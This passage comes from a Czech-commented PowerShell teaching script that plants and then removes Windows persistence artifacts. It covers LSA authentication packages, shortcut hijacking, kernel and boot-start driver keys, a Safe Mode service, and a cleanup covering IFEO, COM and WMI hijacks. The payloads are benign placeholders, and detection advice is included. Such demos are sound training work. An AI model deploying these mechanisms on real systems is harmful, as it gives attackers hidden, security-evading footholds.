                }
                Write-Host "Pridano: 'demo_auth' do MULTI_SZ hodnoty 'Authentication Packages'." -ForegroundColor Green
                Write-Host "Kdy se spousti: pri startu systemu - LSASS nacte vsechny auth packages (demo_auth.dll neexistuje -> log warning)." -ForegroundColor Yellow
                Write-Host "Pouziti: SYSTEM-level credential harvesting - DLL dostane pristup k plaintext passwordum pri autentizaci." -ForegroundColor Yellow
                Write-Host "Detekce: hodnota Authentication Packages v registru, System event log." -ForegroundColor Yellow
                Log-Action "Appended 'demo_auth' to LSA Authentication Packages"
            } catch {
                Write-Host "Chyba pri uprave Authentication Packages: $_" -ForegroundColor Red
                Log-Action "ERROR modifying Authentication Packages: $_"
            }
        }
        34 {
            # Shortcut (.lnk) Modification - Desktop/Taskbar hijack
            Write-Host "Shortcut Modification - .lnk Hijacking."
            $testLnkPath = Join-Path ([Environment]::GetFolderPath("Desktop")) "DemoShortcut.lnk"
            try {
                $WshShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WshShell.CreateShortcut($testLnkPath)
                $Shortcut.TargetPath = "cmd.exe"
                $Shortcut.Arguments = '/k echo Shortcut hijack spustena! Tento shortcut puvodni aplikaci nespusti, ale cmd.exe.'
                $Shortcut.WorkingDirectory = "C:\Windows\System32"
                $Shortcut.WindowStyle = 1
                $Shortcut.Description = "Demo persistence via .lnk modification - Hack3r.cz"
                $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,21"
                $Shortcut.Save()
                Write-Host "Pridano: Desktop shortcut '$testLnkPath' -> Target: cmd.exe" -ForegroundColor Green
                Write-Host "Kdy se spousti: kdyz uzivatel klikne na shortcut (Desktop, Taskbar, Start Menu)." -ForegroundColor Yellow
                Write-Host "Pouziti: velmi nenapadne - hijack existujicich shortcutu (Chrome, Outlook, Word) -> uzivatel nevidi rozdil." -ForegroundColor Yellow
                Write-Host "TIP: kliknete na 'DemoShortcut' na Desktopu - spusti se cmd.exe misto puvodni aplikace." -ForegroundColor Cyan
                Log-Action "Created hijacked .lnk shortcut: $testLnkPath -> cmd.exe"
            } catch {
                Write-Host "Chyba pri vytvareni .lnk: $_" -ForegroundColor Red
                Log-Action "ERROR creating .lnk shortcut: $_"
            }
        }
        35 {
            # Kernel Driver Persistence - Type=1 Service (vyzaduje testsigning nebo valid signature)
            if (-not (Require-Administrator)) { break }
            Write-Host "Kernel Driver Persistence (Service Type=1)."
            Write-Host "POZOR: Kernel driver vyzaduje SIGNED driver nebo test mode (bcdedit /set testsigning on)." -ForegroundColor Red
            Write-Host "Demo pouze vytvori registry klic (driver soubor neexistuje - system ho preskoci)." -ForegroundColor Yellow
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\DemoDriver"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "Type" -Value 1 -PropertyType DWord -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "Start" -Value 1 -PropertyType DWord -Force | Out-Null  # SERVICE_SYSTEM_START
            New-ItemProperty -Path $regPath -Name "ErrorControl" -Value 1 -PropertyType DWord -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "ImagePath" -Value "\SystemRoot\System32\drivers\demo_driver.sys" -PropertyType ExpandString -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "DisplayName" -Value "Demo Kernel Driver (Educational)" -PropertyType String -Force | Out-Null
            Write-Host "Pridano: Kernel driver service 'DemoDriver' -> ImagePath: \SystemRoot\System32\drivers\demo_driver.sys" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri startu systemu (SERVICE_SYSTEM_START) - PRED user-mode procesy." -ForegroundColor Yellow
            Write-Host "Pouziti: rootkit-level persistence - kernel mode, neviditelne pro user-mode monitory." -ForegroundColor Yellow
            Write-Host "Detekce: Services registry (Type=1), driver file check, bootkit scanners." -ForegroundColor Yellow
            Log-Action "Created kernel driver service registry: DemoDriver (driver file neexistuje - demo only)"
        }
        36 {
            # Safe Mode with Networking Persistence
            # V Safe Mode se spousti pouze sluzby a ovladace zaregistrovane v HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\*
            # Tato technika umoznuje persistenci, ktera prezije i restart do Safe Mode (kde obvykle persistence metody nefunguji)
            if (-not (Require-Administrator)) { break }
            Write-Host "Safe Mode with Networking Persistence" -ForegroundColor Cyan
            Write-Host "POZOR: Tato persistence se spusti i v Safe Mode with Networking - obchazi bezne bezpecnostni techniky!" -ForegroundColor Red
            
            try {
                # 1) Vytvorime Windows Service
                $serviceName = "DemoSafeModeNet"
                $binPath = 'cmd.exe /k echo === SAFE MODE PERSISTENCE === Spustena sluzba v Safe Mode with Networking! PC: %COMPUTERNAME% ==='
                
                # Kontrola, jestli sluzba uz neexistuje
                $existingService = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
                if ($existingService) {
                    Write-Host "Sluzba $serviceName uz existuje, mazu..." -ForegroundColor Yellow
                    sc.exe stop $serviceName 2>$null | Out-Null
                    sc.exe delete $serviceName 2>$null | Out-Null
                    Start-Sleep -Seconds 2
                }
                
                # Vytvorime sluzbu s AUTO start
                Write-Host "Vytvarim sluzbu '$serviceName'..." -ForegroundColor Cyan
                sc.exe create $serviceName binPath= "$binPath" start= auto DisplayName= "Demo Safe Mode Network Service" | Out-Null
                
                if ($LASTEXITCODE -ne 0) {
                    Write-Host "Chyba pri vytvareni sluzby (sc.exe exit code: $LASTEXITCODE)" -ForegroundColor Red
                    Log-Action "ERROR creating service $serviceName - sc.exe failed with code $LASTEXITCODE"
                    break
                }
                
                # 2) Pridame sluzbu do Safe Mode whitelistu pro Minimal a Network
                Write-Host "Registruji sluzbu pro Safe Mode with Networking..." -ForegroundColor Cyan
                
                # Safe Boot Minimal (zakladni Safe Mode bez site)
                $safeModeMinPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\$serviceName"
                if (-not (Test-Path $safeModeMinPath)) { 
                    New-Item -Path $safeModeMinPath -Force | Out-Null 
                }
                New-ItemProperty -Path $safeModeMinPath -Name "(Default)" -Value "Service" -PropertyType String -Force | Out-Null
                
                # Safe Boot Network (Safe Mode se siti)
                $safeModeNetPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\$serviceName"
                if (-not (Test-Path $safeModeNetPath)) { 
                    New-Item -Path $safeModeNetPath -Force | Out-Null 
                }
                New-ItemProperty -Path $safeModeNetPath -Name "(Default)" -Value "Service" -PropertyType String -Force | Out-Null
                
                Write-Host "" 
                Write-Host "================================================================" -ForegroundColor Green
                Write-Host "Pridano: Safe Mode persistence" -ForegroundColor Green
                Write-Host "  - Sluzba: $serviceName" -ForegroundColor Green
                Write-Host "  - Binary: cmd.exe (s viditelnym oknem)" -ForegroundColor Green
                Write-Host "  - SafeBoot\Minimal: $safeModeMinPath" -ForegroundColor Green
                Write-Host "  - SafeBoot\Network:  $safeModeNetPath" -ForegroundColor Green
                Write-Host "================================================================" -ForegroundColor Green
                Write-Host ""
                Write-Host "JAK OTESTOVAT:" -ForegroundColor Magenta
                Write-Host "  1) Restartujte pocitac do Safe Mode with Networking:" -ForegroundColor Yellow
                Write-Host "     - Drzet Shift pri restartu -> Troubleshoot -> Advanced -> Startup Settings -> Restart" -ForegroundColor Yellow
                Write-Host "     - Nebo: msconfig -> Boot -> Safe boot: Network" -ForegroundColor Yellow
                Write-Host "  2) Po restartu do Safe Mode se automaticky spusti cmd.exe okno" -ForegroundColor Yellow
                Write-Host "  3) V Safe Mode muzete otevrit services.msc a videt '$serviceName' ve stavu Running" -ForegroundColor Yellow
                Write-Host ""
                Write-Host "KDY SE SPOUSTI: pri kazdem startu systemu (vcetne Normal i Safe Mode with Networking)" -ForegroundColor Yellow
                Write-Host "POUZITI: persistence, ktera obchazi bezpecnostni techniky jako AV/EDR (ty obvykle v Safe Mode nebehou)" -ForegroundColor Yellow
                Write-Host "         - Utocnik tak muze provest cinnost i kdyz obrana probehne do Safe Mode" -ForegroundColor Yellow
                Write-Host "         - Klasicka technika pro ransomware a rootkity" -ForegroundColor Yellow
                Write-Host ""
                Write-Host "DETEKCE: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal a Network klice" -ForegroundColor Cyan
                Write-Host "         Services.msc -> hledani podezrelych sluzeb" -ForegroundColor Cyan
                Write-Host "         Autoruns -> Options -> Include Empty Locations -> SafeBoot" -ForegroundColor Cyan
                Write-Host ""
                
                Log-Action "Created Safe Mode persistence: service=$serviceName, SafeBoot keys created"
            } catch {
                Write-Host "Chyba pri vytvareni Safe Mode persistence: $_" -ForegroundColor Red
                Log-Action "ERROR creating Safe Mode persistence: $_"
            }
        }
        37 {
            # Boot-Start Driver (Bootkit demonstration)
            # Start=0 znamena SERVICE_BOOT_START - spousti se DRIVE nez kernel inicializuje subsystemy
            # Type=1 = KERNEL_DRIVER
            # V realu by to byl MBR rootkit nebo UEFI bootkit, zde jen demonstrace registry artefaktu
            if (-not (Require-Administrator)) { break }
            Write-Host "Boot-Start Driver (Bootkit Demonstration)" -ForegroundColor Cyan
            Write-Host "" 
            Write-Host "================================================================" -ForegroundColor Yellow
            Write-Host "  POZOR: TOTO JE POUZE DEMONSTRACE REGISTRY ARTEFAKTU!" -ForegroundColor Yellow
            Write-Host "  Driver soubor NEEXISTUJE - system ho preskoci pri bootu." -ForegroundColor Yellow
            Write-Host "  Ukazuje pouze KDE a JAK se bootkit registruje." -ForegroundColor Yellow
            Write-Host "================================================================" -ForegroundColor Yellow
            Write-Host "" 
            
            try {
                $driverName = "DemoBootDriver"
                $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$driverName"
                
                Write-Host "Vytvarim Boot-Start Driver registry klic..." -ForegroundColor Cyan
                
                if (-not (Test-Path $regPath)) { 
                    New-Item -Path $regPath -Force | Out-Null 
                }
                
                # Klicove hodnoty pro Boot-Start Driver
                New-ItemProperty -Path $regPath -Name "Type" -Value 1 -PropertyType DWord -Force | Out-Null  # KERNEL_DRIVER
                New-ItemProperty -Path $regPath -Name "Start" -Value 0 -PropertyType DWord -Force | Out-Null  # BOOT_START !!!
                New-ItemProperty -Path $regPath -Name "ErrorControl" -Value 1 -PropertyType DWord -Force | Out-Null  # SERVICE_ERROR_NORMAL
                New-ItemProperty -Path $regPath -Name "Group" -Value "Boot Bus Extender" -PropertyType String -Force | Out-Null
                New-ItemProperty -Path $regPath -Name "ImagePath" -Value "System32\drivers\demo_bootkit.sys" -PropertyType String -Force | Out-Null
                New-ItemProperty -Path $regPath -Name "DisplayName" -Value "Demo Boot-Start Driver (Educational Bootkit Artifact)" -PropertyType String -Force | Out-Null
                New-ItemProperty -Path $regPath -Name "Description" -Value "DEMO: Ukazuje registry artefakt boot-level persistence. Driver neexistuje." -PropertyType String -Force | Out-Null
                
                Write-Host "" 
                Write-Host "================================================================" -ForegroundColor Green
                Write-Host "Pridano: Boot-Start Driver registry artefakt" -ForegroundColor Green
                Write-Host "  - Service: $driverName" -ForegroundColor Green
                Write-Host "  - Registry: $regPath" -ForegroundColor Green
                Write-Host "  - Type: 1 (KERNEL_DRIVER)" -ForegroundColor Green
                Write-Host "  - Start: 0 (BOOT_START) <- Klicove!" -ForegroundColor Green
                Write-Host "  - Group: Boot Bus Extender" -ForegroundColor Green
                Write-Host "  - ImagePath: System32\drivers\demo_bootkit.sys (NEEXISTUJE)" -ForegroundColor Green
                Write-Host "================================================================" -ForegroundColor Green
                Write-Host "" 
                Write-Host "CO TO DEMONSTRUJE:" -ForegroundColor Magenta
                Write-Host "  - Boot-Start Drivers (Start=0) se nacitaji PRED Winlogon, PRED Session Manager" -ForegroundColor Yellow
                Write-Host "  - Spousteji se v KERNEL MODE (Ring 0) - plny pristup k hardware i pameti" -ForegroundColor Yellow
                Write-Host "  - Mohou presmerovat disk I/O, skryt soubory, procesy, registry klice" -ForegroundColor Yellow
                Write-Host "  - Realne bootkity modifikuji MBR (Legacy BIOS) nebo UEFI firmware" -ForegroundColor Yellow
                Write-Host "" 
                Write-Host "TYPY BOOT-LEVEL MALWARE (edukativni prehled):" -ForegroundColor Cyan
                Write-Host "  1) MBR Rootkits (Legacy BIOS systemy):" -ForegroundColor White
                Write-Host "     - TDL4/TDSS, Rovnix, Olmasco, Sinowal" -ForegroundColor Gray
                Write-Host "     - Modifikuji prvnich 512 bytu disku (Master Boot Record)" -ForegroundColor Gray
                Write-Host "     - Spousteji se PRED operacnim systemem" -ForegroundColor Gray
                Write-Host "  2) UEFI Bootkits (moderni systemy):" -ForegroundColor White
                Write-Host "     - LoJax (APT28/Fancy Bear), MosaicRegressor, ESPecter, BlackLotus" -ForegroundColor Gray
                Write-Host "     - Modifikuji UEFI firmware nebo ESP (EFI System Partition)" -ForegroundColor Gray
                Write-Host "     - Preziji REINSTALACI OS i VYMENU DISKU (ulozeno ve firmware)!" -ForegroundColor Gray
                Write-Host "  3) Boot-Start Drivers (tato demonstrace):" -ForegroundColor White
                Write-Host "     - Legitimni Windows mechanismus (pouzivaji antiviry - ELAM)" -ForegroundColor Gray
                Write-Host "     - Start=0 v registry Services" -ForegroundColor Gray
                Write-Host "     - Na modernim Windows vyzaduje WHQL podpis nebo Test Mode" -ForegroundColor Gray
                Write-Host "" 
                Write-Host "DETEKCE:" -ForegroundColor Cyan
                Write-Host "  - Autoruns -> Drivers tab -> filtr 'Boot' nebo 'System'" -ForegroundColor Yellow
                Write-Host "  - PowerShell: Get-Service | Where Start -eq 0" -ForegroundColor Yellow
                Write-Host "  - Registry: HKLM\SYSTEM\CurrentControlSet\Services\* kde Start=0" -ForegroundColor Yellow
                Write-Host "  - Sysmon EID 6 (DriverLoad) + EID 13 (RegistrySetValue)" -ForegroundColor Yellow
                Write-Host "  - Bootkit scannery: GMER, TDSSKiller, Rootkit Revealer" -ForegroundColor Yellow
                Write-Host "  - UEFI firmware integrita: chipsec, UEFITool" -ForegroundColor Yellow
                Write-Host "" 
                Write-Host "MODERNA OCHRANA:" -ForegroundColor Cyan
                Write-Host "  - UEFI Secure Boot (podepsane bootloadery)" -ForegroundColor Yellow
                Write-Host "  - TPM + Measured Boot (detekce zmen boot procesu)" -ForegroundColor Yellow
                Write-Host "  - ELAM (Early Launch Anti-Malware) - AV nacitane pred drivery" -ForegroundColor Yellow
                Write-Host "  - Driver Signature Enforcement (Windows 10+)" -ForegroundColor Yellow
                Write-Host "  - Virtualization-based Security (VBS) - Credential Guard, HVCI" -ForegroundColor Yellow
                Write-Host "" 
                Write-Host "PROC TOTO V DEMU NENI SKUTECNY BOOTKIT:" -ForegroundColor Magenta
                Write-Host "  1) Driver soubor demo_bootkit.sys NEEXISTUJE - system ho preskoci" -ForegroundColor Gray
                Write-Host "  2) Zadna modifikace MBR ani UEFI firmware" -ForegroundColor Gray
                Write-Host "  3) System zustane PLNE BOOTOVATELNY" -ForegroundColor Gray
                Write-Host "  4) Pouze REGISTRY ARTEFAKT pro demonstraci detekce" -ForegroundColor Gray
                Write-Host "" 
                Write-Host "MITRE ATT&CK: T1542.003 (Bootkit), T1014 (Rootkit)" -ForegroundColor Cyan
                Write-Host "" 
                
                Log-Action "Created Boot-Start Driver registry artifact: $driverName (Type=1, Start=0, driver file NEEXISTUJE - demo only)"
            } catch {
                Write-Host "Chyba pri vytvareni Boot-Start Driver: $_" -ForegroundColor Red
                Log-Action "ERROR creating Boot-Start Driver: $_"
            }
        }
        0 {
            Write-Host "Ukoncuji skript." -ForegroundColor Cyan
            exit
        }
        90 {
            # Elevace: pokud skript nebezi jako Administrator, spusti se znovu se zvysenymi pravy (UAC prompt).
            if (Test-Administrator) {
                Write-Host "Skript uz je spusten jako Administrator - neni potreba nic delat." -ForegroundColor Green
                Log-Action "Restart-as-Admin volba pouzita, ale skript uz bezi jako admin"
            } else {
                Write-Host "Skript neni spusten jako Administrator." -ForegroundColor Yellow
                Write-Host "Spoustim novou instanci s admin pravy - potvrdte UAC prompt." -ForegroundColor Yellow
                try {
                    # $PSCommandPath je nastaven automaticky ve script scope
                    $scriptPath = $PSCommandPath
                    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
                    if (-not $scriptPath -or -not (Test-Path $scriptPath)) {
                        Write-Host "Chyba: nepodarilo se ziskat cestu k tomuto skriptu." -ForegroundColor Red
                        Log-Action "ERROR Restart-as-Admin: nelze zjistit cestu skriptu"
                        break
                    }
                    Write-Host "Cesta skriptu: $scriptPath" -ForegroundColor Cyan
                    Start-Process -FilePath "powershell.exe" -ArgumentList @(
                        "-NoProfile",
                        "-ExecutionPolicy", "Bypass",
                        "-File", "`"$scriptPath`""
                    ) -Verb RunAs -ErrorAction Stop
                    Write-Host "Nova instance byla spustena. Puvodni (bez admin) se ted ukonci." -ForegroundColor Green
                    Log-Action "Restarted script as Administrator: $scriptPath"
                    Start-Sleep -Seconds 2
                    exit
                } catch {
                    Write-Host "Chyba pri elevaci: $_" -ForegroundColor Red
                    Write-Host "Mozne priciny: uzivatel odmitl UAC, nebo neni v roli, ktera muze elevovat." -ForegroundColor Yellow
                    Log-Action "ERROR during Restart-as-Admin: $_"
                }
            }
        }
        99 {
            # Cleanup function to remove all persistence techniques
            # This ensures that the system is returned to its original state
            if (-not (Require-Administrator)) { break }
            Write-Host "Odstranuji vsechny persistence techniky..."


            sc.exe stop Demo | Out-Null
            sc.exe delete Demo | Out-Null

            Log-Action "Removed service: Demo (stopped and deleted)"


            Remove-Item -Path (Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd") -ErrorAction SilentlyContinue
            Remove-Item -Path (Join-Path $env:ALLUSERSPROFILE "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd") -ErrorAction SilentlyContinue

            Log-Action "Removed startup files from per-user and all-users Startup"


            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue

            Log-Action "Removed Run registry entries (HKCU/HKLM/WOW6432Node) for 'demo'"


            Unregister-ScheduledTask -TaskName "Demo30MinTask" -Confirm:$false -ErrorAction SilentlyContinue

            Log-Action "Unregistered scheduled task: Demo30MinTask"


            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe" -Recurse -Force -ErrorAction SilentlyContinue

            Log-Action "Removed IFEO entry for charmap.exe"


            $filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq "DetektorOdhalovaniNapadeni" }
            if ($filter) { $filter.Delete() }
            $consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "HlidacKlicovychProcesu" }
            if ($consumer) { $consumer.Delete() }
            $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*DetektorOdhalovaniNapadeni*" -or $_.Consumer -like "*HlidacKlicovychProcesu*" }
            foreach ($b in $bindings) { $b.Delete() }

            Log-Action "Removed WMI filter/consumer/bindings: DetektorOdhalovaniNapadeni / HlidacKlicovychProcesu"


            Remove-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -ErrorAction SilentlyContinue
            Remove-Item -Path "HKCU:\Software\Microsoft\Office test" -Recurse -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe" -ErrorAction SilentlyContinue

            Log-Action "Removed AppInit_DLLs, LogonScript, Screensaver, Office test key and reset Winlogon Shell"

            # --- Cleanup rozsirenych technik (15-23) ---

            # 15/16 RunOnce (HKCU / HKLM)
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "demoOnce" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "demoOnce" -ErrorAction SilentlyContinue
            Log-Action "Removed RunOnce entries (HKCU/HKLM) for 'demoOnce'"

            # 17 PowerShell Profile - odstranime jen radek s demo markerem
            try {
                $profilePath = $PROFILE.CurrentUserAllHosts
                if (Test-Path $profilePath) {
                    $lines = Get-Content $profilePath -ErrorAction SilentlyContinue
                    $filtered = $lines | Where-Object { $_ -notmatch 'DEMO_PERSISTENCE_MARKER' }
                    if ($filtered) {
                        Set-Content -Path $profilePath -Value $filtered -Encoding UTF8
                    } else {
                        # profil zustal prazdny - smazeme cely soubor
                        Remove-Item -Path $profilePath -Force -ErrorAction SilentlyContinue
                    }
                }
                Log-Action "Removed DEMO_PERSISTENCE_MARKER line from PowerShell profile"
            } catch {
                Log-Action "ERROR cleaning PowerShell profile: $_"
            }

            # 18 COM Hijacking (HKCU CLSID)
            Remove-Item -Path "HKCU:\Software\Classes\CLSID\{DEADBEEF-1234-5678-9ABC-DEF012345678}" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed COM Hijack CLSID {DEADBEEF-1234-5678-9ABC-DEF012345678}"

            # 19 Utilman / Sticky Keys IFEO hijack
            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed IFEO entry for utilman.exe"

            # 20 Netsh Helper DLL
            Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Netsh" -Name "demo" -ErrorAction SilentlyContinue
            Log-Action "Removed Netsh helper registration 'demo'"

            # 21 BITS Job
            try {
                & bitsadmin /cancel "DemoBitsJob" 2>$null | Out-Null
                Log-Action "Cancelled BITS job DemoBitsJob"
            } catch {
                Log-Action "ERROR cancelling BITS job: $_"
            }

            # 22 Winlogon Userinit - obnoveni na vychozi hodnotu
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\system32\userinit.exe," -ErrorAction SilentlyContinue
            Log-Action "Reset Winlogon Userinit to default"

            # 23 Scheduled Task s SESSION_LOCK triggerem
            Unregister-ScheduledTask -TaskName "DemoLockScreenTask" -Confirm:$false -ErrorAction SilentlyContinue
            Log-Action "Unregistered scheduled task: DemoLockScreenTask"

            # --- Cleanup rozsirenych technik (24-30) ---

            # 24 Active Setup
            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{FEEDFACE-1234-5678-9ABC-DEF012345678}" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed Active Setup component {FEEDFACE-...}"

            # 25 AppCertDLLs
            Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" -Name "demo" -ErrorAction SilentlyContinue
            Log-Action "Removed AppCertDlls entry 'demo'"

            # 26 Print Port Monitor
            Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\DemoMonitor" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed Port Monitor DemoMonitor"

            # 27 Time Provider
            Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\DemoProvider" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed Time Provider DemoProvider"

            # 28 SSP - odstranime demo_ssp z MULTI_SZ
            try {
                $lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
                $current = (Get-ItemProperty -Path $lsaPath -Name "Security Packages" -ErrorAction SilentlyContinue)."Security Packages"
                if ($current -contains "demo_ssp") {
                    $new = @($current | Where-Object { $_ -ne "demo_ssp" })
                    Set-ItemProperty -Path $lsaPath -Name "Security Packages" -Value $new -Force | Out-Null
                }
                Log-Action "Removed 'demo_ssp' from LSA Security Packages"
            } catch {
                Log-Action "ERROR cleaning SSP: $_"
            }

            # 29 Silent Process Exit - odstranime SPE klic notepadu a GlobalFlag z IFEO notepadu
            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" -Recurse -Force -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name "GlobalFlag" -ErrorAction SilentlyContinue
            # Pokud je IFEO klic notepadu prazdny, smazeme cely klic
            try {
                $ifeoNotepad = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
                if (Test-Path $ifeoNotepad) {
                    $item = Get-Item $ifeoNotepad
                    if ($item.Property.Count -eq 0 -and $item.SubKeyCount -eq 0) {
                        Remove-Item -Path $ifeoNotepad -Force -ErrorAction SilentlyContinue
                    }
                }
            } catch {}
            Log-Action "Removed Silent Process Exit hook for notepad.exe"

            # 30 File Association Hijack - .demopers
            Remove-Item -Path "HKCU:\Software\Classes\.demopers" -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item -Path "HKCU:\Software\Classes\demopers.file" -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item -Path (Join-Path $env:TEMP "test.demopers") -Force -ErrorAction SilentlyContinue
            Log-Action "Removed .demopers file association and test file"

            # --- Cleanup novych technik (31-35) ---

            # 31 sethc.exe IFEO hijack
            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed IFEO entry for sethc.exe"

            # 32 osk.exe IFEO hijack
            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed IFEO entry for osk.exe"

            # 33 LSA Authentication Package
            try {
                $lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
                $current = (Get-ItemProperty -Path $lsaPath -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"
                if ($current -contains "demo_auth") {
                    $new = @($current | Where-Object { $_ -ne "demo_auth" })
                    Set-ItemProperty -Path $lsaPath -Name "Authentication Packages" -Value $new -Force | Out-Null
                }
                Log-Action "Removed 'demo_auth' from LSA Authentication Packages"
            } catch {
                Log-Action "ERROR cleaning Authentication Package: $_"
            }

            # 34 Shortcut hijack
            Remove-Item -Path (Join-Path ([Environment]::GetFolderPath("Desktop")) "DemoShortcut.lnk") -Force -ErrorAction SilentlyContinue
            Log-Action "Removed Desktop shortcut DemoShortcut.lnk"

            # 35 Kernel Driver service
            Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoDriver" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed kernel driver service registry: DemoDriver"

            # 36 Safe Mode with Networking persistence
            try {
                $serviceName = "DemoSafeModeNet"
                $svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
                if ($svc) {
                    sc.exe stop $serviceName 2>$null | Out-Null
                    sc.exe delete $serviceName 2>$null | Out-Null
                }
                Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\$serviceName" -Recurse -Force -ErrorAction SilentlyContinue
                Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\$serviceName" -Recurse -Force -ErrorAction SilentlyContinue
                Log-Action "Removed Safe Mode persistence: service $serviceName and SafeBoot registry keys"
            } catch {
                Log-Action "ERROR removing Safe Mode persistence: $_"
            }

            # 37 Boot-Start Driver
            Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoBootDriver" -Recurse -Force -ErrorAction SilentlyContinue
            Log-Action "Removed Boot-Start Driver registry artifact: DemoBootDriver"

            Write-Host "Vsechny persistence techniky byly odstraneny."
        }
        Default { Write-Host "Neplatna volba." }
    }

    Write-Host ""
    Write-Host "Stisknete Enter pro navrat do menu..."
    [void][System.Console]::ReadLine()
} while ($true)
